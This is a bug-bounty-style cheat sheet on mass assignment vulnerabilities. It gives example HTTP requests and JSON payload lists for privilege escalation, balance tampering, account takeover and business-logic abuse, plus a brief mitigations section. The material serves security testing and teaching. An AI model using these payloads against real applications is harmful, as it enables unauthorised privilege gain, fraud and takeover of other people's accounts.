## Overview

Mass Assignment is a modern vulnerability that occurs when an application allows users to manually add or modify parameters in HTTP requests, and the app processes these parameters without proper filtering. This typically happens when entire objects are passed directly into database create/update queries, allowing attackers to modify fields they shouldn't have access to.

**Common in:** Ruby on Rails, NodeJS, and modern API frameworks

**Core Issue:** Apps trust user input to update object properties without validating which fields should be writable

---

## Exploitation Methods

### Step 1: Identify Data-Returning Endpoints

- Look for URLs that return user/object data
- Collect all objects and their fields from responses
- Pay attention to fields like:
    - `isAdmin`, `role`, `permission`
    - `balance`, `credit`, `wallet`
    - `verified`, `approved`, `status`
    - `userId`, `accountType`, `level`

### Step 2: Find State-Changing Requests

Target endpoints that:

- Create new records (POST `/user`, `/account`)
- Update existing data (PUT/PATCH `/profile`, `/settings`)
- Modify properties (POST `/edit`, `/update`)

### Step 3: Basic Exploitation

**Normal Request:**

```http
POST /editdata HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "daffa"
}
```

**Response shows hidden fields:**

```json
{
  "status": "success",
  "username": "daffa",
  "isAdmin": "false"
}
```

**Modified Attack Request:**

```http
POST /editdata HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "daffa",
  "isAdmin": true
}
```

**Success Response:**

```json
{
  "status": "success",
  "username": "daffa",
  "isAdmin": "true"
}
```

### Step 4: Parameter Fuzzing Technique

When you don't know field names, try fuzzing:

```http
POST /v1/merchant/account HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "name": "ali",
  "email": "ali@ali.com",
  "FUZZ": "test"
}
```

**Use wordlists with common parameters:**

- `admin`, `isAdmin`, `is_admin`
- `role`, `user_role`, `account_role`
- `verified`, `is_verified`, `email_verified`
- `balance`, `credits`, `coins`
- `permission`, `permissions`, `access_level`

---

## Bypasses

### Different Parameter Formats

Try multiple naming conventions:

- `isAdmin` vs `is_admin` vs `IsAdmin`
- `role` vs `user_role` vs `userRole`
- Nested objects: `{"user": {"isAdmin": true}}`

### JSON vs Form-Data

Switch content types:

```http
# JSON format
{"admin": true}

# Form-data format
admin=true

# URL-encoded
admin=true&verified=1
```

### Array/Object Injection

```json
{
  "username": "hacker",
  "permissions": ["admin", "superuser"],
  "role": {"name": "admin", "level": 99}
}
```

---

## Payloads

### Privilege Escalation

```json
{"isAdmin": true}
{"role": "admin"}
{"admin": 1}
{"user_role": "administrator"}
{"permissions": ["admin", "write", "delete"]}
{"access_level": 99}
{"account_type": "premium"}
{"is_verified": true}
{"approved": true}
{"superuser": true}
```

---

## Higher Impact

### Financial Impact

```json
{"balance": 999999}
{"credits": 100000}
{"wallet": 50000}
{"discount": 100}
{"price": 0}
```

### Account Takeover Chain

```json
{"email": "attacker@evil.com"}
{"phone": "+1234567890"}
{"password": "hacked123"}
{"2fa_enabled": false}
```

### Business Logic Abuse

```json
{"status": "approved"}
{"verified": true}
{"subscription": "enterprise"}
{"trial_days": 36500}
{"max_users": 999999}
```

---

## Mitigations

### For Developers

1. **Use allowlists** - Only permit specific fields to be updated
2. **Implement Strong Parameters** (Rails) or DTOs (other frameworks)
3. **Separate input models from database models**
4. **Never bind request data directly to database objects**
5. **Validate field-level permissions before updates**
6. **Use read-only fields for sensitive properties**

### Detection Tips for Hunters

✅ **High-value targets:**

- User profile update endpoints
- Account creation APIs
- Settings/preferences pages
- Admin panel forms
- Merchant/vendor registration

✅ **Quick wins:**

- Compare request parameters vs response fields
- Look for boolean flags in responses (`isAdmin: false`)
- Test numeric fields (balances, credits, levels)
- Try adding parameters from other user types

---

## References

- [Pentester Academy - Hunting for Mass Assignment](https://blog.pentesteracademy.com/hunting-for-mass-assignment-56ed73095eda)